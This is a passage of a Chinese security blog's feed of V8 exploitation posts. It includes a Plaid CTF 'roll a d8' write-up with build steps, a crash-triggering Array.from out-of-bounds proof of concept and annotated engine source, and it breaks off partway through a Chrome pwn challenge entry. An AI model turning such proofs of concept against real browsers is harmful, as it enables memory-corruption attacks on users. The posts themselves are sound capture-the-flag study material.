    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;该漏洞源于 V8 引擎的 Maglev 编译器在处理具有父类的类时的编译机制。在此场景下，编译器需遍历所有父类及其构造函数进行查找，而此过程中引入了安全漏洞，该漏洞的补丁和详细信息可以从&lt;a href=&quot;https://issues.chromium.org/issues/41488920&quot;&gt;chrome issues&lt;/a&gt;中来进行查看，下面我们将对此漏洞进行详细的分析以及对&lt;code&gt;v8 shell&lt;/code&gt;的提权操作&lt;/p&gt;</summary>
    
    
    
    
    <category term="v8" scheme="http://example.com/tags/v8/"/>
    
    <category term="oob" scheme="http://example.com/tags/oob/"/>
    
  </entry>
  
  <entry>
    <title>V8-turboFan</title>
    <link href="http://example.com/2025/01/16/V8-turboFan/"/>
    <id>http://example.com/2025/01/16/V8-turboFan/</id>
    <published>2025-01-16T11:27:58.000Z</published>
    <updated>2025-02-02T08:54:59.084Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>v8 是一种 JS 引擎的实现，它由Google开发，使用C++编写。v8 被设计用于提高网页浏览器内部 JavaScript 代码执行的性能。为了提高性能，v8 将会把 JS 代码转换为更高效的机器码，而非传统的使用解释器执行。因此 v8 引入了 JIT (Just-In-Time) 机制，该机制将会在运行时动态编译 JS 代码为机器码，以提高运行速度。<br>TurboFan是 v8 的优化编译器之一，它使用了 sea of nodes 这个编译器概念。</p><span id="more"></span>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;v8 是一种 JS 引擎的实现，它由Google开发，使用C++编写。v8 被设计用于提高网页浏览器内部 JavaScript 代码执行的性能。为了提高性能，v8 将会把 JS 代码转换为更高效的机器码，而非传统的使用解释器执行。因此 v8 引入了 JIT (Just-In-Time) 机制，该机制将会在运行时动态编译 JS 代码为机器码，以提高运行速度。&lt;br&gt;TurboFan是 v8 的优化编译器之一，它使用了 sea of nodes 这个编译器概念。&lt;/p&gt;</summary>
    
    
    
    
    <category term="v8" scheme="http://example.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>Plaid CTF roll a d8</title>
    <link href="http://example.com/2023/11/27/Plaid-CTF-roll-a-d8/"/>
    <id>http://example.com/2023/11/27/Plaid-CTF-roll-a-d8/</id>
    <published>2023-11-26T23:23:40.000Z</published>
    <updated>2025-02-02T08:54:49.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#回溯版本到包含漏洞版本</span></span><br><span class="line">$ git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599</span><br><span class="line">$ gclient <span class="built_in">sync</span></span><br><span class="line"><span class="comment">#分别编译Debug和Release版本</span></span><br><span class="line">$ tools/dev/v8gen.py x64.debug </span><br><span class="line">$ ninja -C out.gn/x64.debug d8</span><br><span class="line">$ tools/dev/v8gen.py x64.release</span><br><span class="line">$ ninja -C out.gn/x64.release d8</span><br></pre></td></tr></table></figure><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该漏洞是一个真实存在的漏洞，我们查看其diff会发现其实就是将<code>GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime)</code>改为<code>GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);</code>,之后我们查看一下官方给出的poc</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [];<span class="comment">//创建了一个oobArray数组对象</span></span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;<span class="comment">//8244</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property">from</span>.<span class="title function_">call</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] : <span class="function"><span class="params">_</span> =&gt;</span> ( <span class="comment">//实现了一个迭代器</span></span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    <span class="title function_">next</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="variable language_">this</span>.<span class="property">counter</span>++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">counter</span> &gt; maxSize) &#123;</span><br><span class="line">        oobArray.<span class="property">length</span> = <span class="number">0</span>;<span class="comment">//在迭代器中将oobArray.length置零</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"><span class="comment">//%DebugPrint(oobArray);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">oobArray[oobArray.<span class="property">length</span> - <span class="number">1</span>] = <span class="number">0x41414141</span>;<span class="comment">//触发crash</span></span><br></pre></td></tr></table></figure><p>我们可以在命令行运行一下就会发现其会触发一个<code>crash</code>，之后我们使用<code>%DebugPrint</code>来调试一下看一下oobArray的变化</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">❯ ./out.gn/x64.release/d8 ./test.js --allow-natives-syntax </span><br><span class="line">array: 0x7f8ef20df11 &lt;JSArray[0]&gt;</span><br><span class="line">0x7f8ef20df11 &lt;JSArray[8192]&gt;</span><br></pre></td></tr></table></figure><p>我们可以发现其长度变成了一个很大的值，那么为什么会发生这样的变化就需要我们查看源码。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>我们可以发现poc中调用了Arrayfrom，我们查看其源码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">TF_BUILTIN</span>(ArrayFrom, ArrayPopulatorAssembler) &#123;</span><br><span class="line">  TNode&lt;Context&gt; context = <span class="built_in">CAST</span>(<span class="built_in">Parameter</span>(BuiltinDescriptor::kContext));</span><br><span class="line">  TNode&lt;Int32T&gt; argc =</span><br><span class="line">      <span class="built_in">UncheckedCast</span>&lt;Int32T&gt;(<span class="built_in">Parameter</span>(BuiltinDescriptor::kArgumentsCount));</span><br><span class="line"></span><br><span class="line">  <span class="function">CodeStubArguments <span class="title">args</span><span class="params">(<span class="keyword">this</span>, ChangeInt32ToIntPtr(argc))</span></span>;</span><br><span class="line"></span><br><span class="line">  TNode&lt;Object&gt; map_function = args.<span class="built_in">GetOptionalArgumentValue</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If map_function is not undefined, then ensure it&#x27;s callable else throw.</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">Label <span class="title">no_error</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">error</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">    <span class="built_in">GotoIf</span>(<span class="built_in">IsUndefined</span>(map_function), &amp;no_error);</span><br><span class="line">    <span class="built_in">GotoIf</span>(<span class="built_in">TaggedIsSmi</span>(map_function), &amp;error);</span><br><span class="line">    <span class="built_in">Branch</span>(<span class="built_in">IsCallable</span>(map_function), &amp;no_error, &amp;error);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;error);</span><br><span class="line">    <span class="built_in">ThrowTypeError</span>(context, MessageTemplate::kCalledNonCallable, map_function);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;no_error);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Label <span class="title">iterable</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">not_iterable</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">finished</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">if_exception</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  TNode&lt;Object&gt; this_arg = args.<span class="built_in">GetOptionalArgumentValue</span>(<span class="number">2</span>);</span><br><span class="line">  TNode&lt;Object&gt; items = args.<span class="built_in">GetOptionalArgumentValue</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="comment">// The spec doesn&#x27;t require ToObject to be called directly on the iterable</span></span><br><span class="line">  <span class="comment">// branch, but it&#x27;s part of GetMethod that is in the spec.</span></span><br><span class="line">  TNode&lt;JSReceiver&gt; array_like = <span class="built_in">ToObject</span>(context, items);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TVARIABLE</span>(Object, array);</span><br><span class="line">  <span class="built_in">TVARIABLE</span>(Number, length);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Determine whether items[Symbol.iterator] is defined:</span></span><br><span class="line">  <span class="function">IteratorBuiltinsAssembler <span class="title">iterator_assembler</span><span class="params">(state())</span></span>;</span><br><span class="line">  Node* iterator_method =</span><br><span class="line">      iterator_assembler.<span class="built_in">GetIteratorMethod</span>(context, array_like);</span><br><span class="line">      <span class="comment">//判断是不是可迭代的</span></span><br><span class="line">  <span class="built_in">Branch</span>(<span class="built_in">IsNullOrUndefined</span>(iterator_method), &amp;not_iterable, &amp;iterable);</span><br><span class="line">  <span class="comment">//如果是可迭代的</span></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">TVARIABLE</span>(Number, index, <span class="built_in">SmiConstant</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">TVARIABLE</span>(Object, var_exception);</span><br><span class="line">    <span class="function">Label <span class="title">loop</span><span class="params">(<span class="keyword">this</span>, &amp;index)</span>, <span class="title">loop_done</span><span class="params">(<span class="keyword">this</span>)</span>,</span></span><br><span class="line"><span class="function">        <span class="title">on_exception</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>,</span></span><br><span class="line"><span class="function">        <span class="title">index_overflow</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the method is callable.</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function">Label <span class="title">get_method_not_callable</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>, <span class="title">next</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">      <span class="comment">//检查是不是Smi和可调用的</span></span><br><span class="line">      <span class="built_in">GotoIf</span>(<span class="built_in">TaggedIsSmi</span>(iterator_method), &amp;get_method_not_callable);</span><br><span class="line">      <span class="built_in">GotoIfNot</span>(<span class="built_in">IsCallable</span>(iterator_method), &amp;get_method_not_callable);</span><br><span class="line">      <span class="built_in">Goto</span>(&amp;next);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">BIND</span>(&amp;get_method_not_callable);</span><br><span class="line">      <span class="built_in">ThrowTypeError</span>(context, MessageTemplate::kCalledNonCallable,</span><br><span class="line">                     iterator_method);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">BIND</span>(&amp;next);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Construct the output array with empty length.</span></span><br><span class="line">    <span class="comment">//这里保存的是我们传入的数组，下面的print输出和我们在js里面打印出来的数组地址是一样的</span></span><br><span class="line">    array = <span class="built_in">ConstructArrayLike</span>(context, args.<span class="built_in">GetReceiver</span>());</span><br><span class="line">    <span class="built_in">Print</span>(<span class="string">&quot;array&quot;</span>, <span class="built_in">static_cast</span>&lt;Node*&gt;(array.<span class="built_in">value</span>()));</span><br><span class="line">    <span class="comment">// Actually get the iterator and throw if the iterator method does not yield</span></span><br><span class="line">    <span class="comment">// one.</span></span><br><span class="line">    <span class="comment">//获取迭代器</span></span><br><span class="line">    IteratorRecord iterator_record =</span><br><span class="line">        iterator_assembler.<span class="built_in">GetIterator</span>(context, items, iterator_method);</span><br><span class="line"></span><br><span class="line">    TNode&lt;Context&gt; native_context = <span class="built_in">LoadNativeContext</span>(context);</span><br><span class="line">    TNode&lt;Object&gt; fast_iterator_result_map =</span><br><span class="line">        <span class="built_in">LoadContextElement</span>(native_context, Context::ITERATOR_RESULT_MAP_INDEX);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Goto</span>(&amp;loop);</span><br><span class="line">    <span class="comment">//迭代循环</span></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;loop);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Loop while iterator is not done.</span></span><br><span class="line">      TNode&lt;Object&gt; next = <span class="built_in">CAST</span>(iterator_assembler.<span class="built_in">IteratorStep</span>(</span><br><span class="line">          context, iterator_record, &amp;loop_done, fast_iterator_result_map));</span><br><span class="line">      <span class="built_in">TVARIABLE</span>(Object, value,</span><br><span class="line">                <span class="built_in">CAST</span>(iterator_assembler.<span class="built_in">IteratorValue</span>(</span><br><span class="line">                    context, next, fast_iterator_result_map)));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If a map_function is supplied then call it (using this_arg as</span></span><br><span class="line">      <span class="comment">// receiver), on the value returned from the iterator. Exceptions are</span></span><br><span class="line">      <span class="comment">// caught so the iterator can be closed.</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="function">Label <span class="title">next</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">        <span class="built_in">GotoIf</span>(<span class="built_in">IsUndefined</span>(map_function), &amp;next);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IsCallable</span>(map_function));</span><br><span class="line">        Node* v = <span class="built_in">CallJS</span>(CodeFactory::<span class="built_in">Call</span>(<span class="built_in">isolate</span>()), context, map_function,</span><br><span class="line">                         this_arg, value.<span class="built_in">value</span>(), index.<span class="built_in">value</span>());</span><br><span class="line">        <span class="built_in">GotoIfException</span>(v, &amp;on_exception, &amp;var_exception);</span><br><span class="line">        value = <span class="built_in">CAST</span>(v);</span><br><span class="line">        <span class="built_in">Goto</span>(&amp;next);</span><br><span class="line">        <span class="built_in">BIND</span>(&amp;next);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Store the result in the output object (catching any exceptions so the</span></span><br><span class="line">      <span class="comment">// iterator can be closed).</span></span><br><span class="line">      Node* define_status =</span><br><span class="line">          <span class="built_in">CallRuntime</span>(Runtime::kCreateDataProperty, context, array.<span class="built_in">value</span>(),</span><br><span class="line">                      index.<span class="built_in">value</span>(), value.<span class="built_in">value</span>());</span><br><span class="line">      <span class="built_in">GotoIfException</span>(define_status, &amp;on_exception, &amp;var_exception);</span><br><span class="line"></span><br><span class="line">      index = <span class="built_in">NumberInc</span>(index.<span class="built_in">value</span>());</span><br><span class="line">      <span class="comment">// Print(&quot;index is &quot; , index.value());</span></span><br><span class="line">      <span class="comment">// The spec requires that we throw an exception if index reaches 2^53-1,</span></span><br><span class="line">      <span class="comment">// but an empty loop would take &gt;100 days to do this many iterations. To</span></span><br><span class="line">      <span class="comment">// actually run for that long would require an iterator that never set</span></span><br><span class="line">      <span class="comment">// done to true and a target array which somehow never ran out of memory,</span></span><br><span class="line">      <span class="comment">// e.g. a proxy that discarded the values. Ignoring this case just means</span></span><br><span class="line">      <span class="comment">// we would repeatedly call CreateDataProperty with index = 2^53.</span></span><br><span class="line">      <span class="built_in">CSA_ASSERT_BRANCH</span>(<span class="keyword">this</span>, [&amp;](Label* ok, Label* not_ok) &#123;</span><br><span class="line">        <span class="built_in">BranchIfNumberRelationalComparison</span>(Operation::kLessThan, index.<span class="built_in">value</span>(),</span><br><span class="line">                                           <span class="built_in">NumberConstant</span>(kMaxSafeInteger), ok,</span><br><span class="line">                                           not_ok);</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="built_in">Goto</span>(&amp;loop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;loop_done);</span><br><span class="line">    &#123;</span><br><span class="line">      length = index;</span><br><span class="line">      <span class="built_in">Goto</span>(&amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;on_exception);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Close the iterator, rethrowing either the passed exception or</span></span><br><span class="line">      <span class="comment">// exceptions thrown during the close.</span></span><br><span class="line">      iterator_assembler.<span class="built_in">IteratorCloseOnException</span>(context, iterator_record,</span><br><span class="line">                                                  &amp;var_exception);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Since there&#x27;s no iterator, items cannot be a Fast JS Array.</span></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;not_iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">Word32BinaryNot</span>(<span class="built_in">IsFastJSArray</span>(array_like, context)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Treat array_like as an array and try to get its length.</span></span><br><span class="line">    length = <span class="built_in">ToLength_Inline</span>(</span><br><span class="line">        context, <span class="built_in">GetProperty</span>(context, array_like, <span class="built_in">factory</span>()-&gt;<span class="built_in">length_string</span>()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Construct an array using the receiver as constructor with the same length</span></span><br><span class="line">    <span class="comment">// as the input array.</span></span><br><span class="line">    array = <span class="built_in">ConstructArrayLike</span>(context, args.<span class="built_in">GetReceiver</span>(), length.<span class="built_in">value</span>());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">TVARIABLE</span>(Number, index, <span class="built_in">SmiConstant</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GotoIf</span>(<span class="built_in">SmiEqual</span>(length.<span class="built_in">value</span>(), <span class="built_in">SmiConstant</span>(<span class="number">0</span>)), &amp;finished);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Loop from 0 to length-1.</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function">Label <span class="title">loop</span><span class="params">(<span class="keyword">this</span>, &amp;index)</span></span>;</span><br><span class="line">      <span class="built_in">Goto</span>(&amp;loop);</span><br><span class="line">      <span class="built_in">BIND</span>(&amp;loop);</span><br><span class="line">      <span class="built_in">TVARIABLE</span>(Object, value);</span><br><span class="line"></span><br><span class="line">      value = <span class="built_in">GetProperty</span>(context, array_like, index.<span class="built_in">value</span>());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If a map_function is supplied then call it (using this_arg as</span></span><br><span class="line">      <span class="comment">// receiver), on the value retrieved from the array.</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="function">Label <span class="title">next</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">        <span class="built_in">GotoIf</span>(<span class="built_in">IsUndefined</span>(map_function), &amp;next);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IsCallable</span>(map_function));</span><br><span class="line">        value = <span class="built_in">CAST</span>(<span class="built_in">CallJS</span>(CodeFactory::<span class="built_in">Call</span>(<span class="built_in">isolate</span>()), context, map_function,</span><br><span class="line">                            this_arg, value.<span class="built_in">value</span>(), index.<span class="built_in">value</span>()));</span><br><span class="line">        <span class="built_in">Goto</span>(&amp;next);</span><br><span class="line">        <span class="built_in">BIND</span>(&amp;next);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Store the result in the output object.</span></span><br><span class="line">      <span class="built_in">CallRuntime</span>(Runtime::kCreateDataProperty, context, array.<span class="built_in">value</span>(),</span><br><span class="line">                  index.<span class="built_in">value</span>(), value.<span class="built_in">value</span>());</span><br><span class="line">      index = <span class="built_in">NumberInc</span>(index.<span class="built_in">value</span>());</span><br><span class="line">      <span class="built_in">BranchIfNumberRelationalComparison</span>(Operation::kLessThan, index.<span class="built_in">value</span>(),</span><br><span class="line">                                         length.<span class="built_in">value</span>(), &amp;loop, &amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;finished);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Finally set the length on the output and return it.</span></span><br><span class="line">  <span class="built_in">GenerateSetLength</span>(context, array.<span class="built_in">value</span>(), length.<span class="built_in">value</span>());</span><br><span class="line">  args.<span class="built_in">PopAndReturn</span>(array.<span class="built_in">value</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;</summary>
    
    
    
    
    <category term="v8" scheme="http://example.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>数字经济线下-Chrome pwn</title>
    <link href="http://example.com/2023/11/20/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Chrome-pwn/"/>
    <id>http://example.com/2023/11/20/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Chrome-pwn/</id>
    <published>2023-11-19T22:41:49.000Z</published>
    <updated>2025-02-02T08:55:07.502Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用如下方法编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 0ec93e047216979431bd6f147ab5956bb729afa2</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入patch，编译release版本的d8</span></span><br><span class="line">git apply --ignore-space-change --ignore-whitespace ../diff.patch</span><br><span class="line">tools/dev/v8gen.py x64.release </span><br><span class="line">ninja -C out.gn/x64.release d8</span><br><span class="line"><span class="comment">#该题其实不能使用debug版本的v8，只能使用release版本的v8</span></span><br><span class="line"><span class="comment"># 编译debug版本的d8</span></span><br><span class="line">tools/dev/v8gen.py x64.debug </span><br><span class="line">ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure><span id="more"></span><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>题目给出的<code>patch</code>文件如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 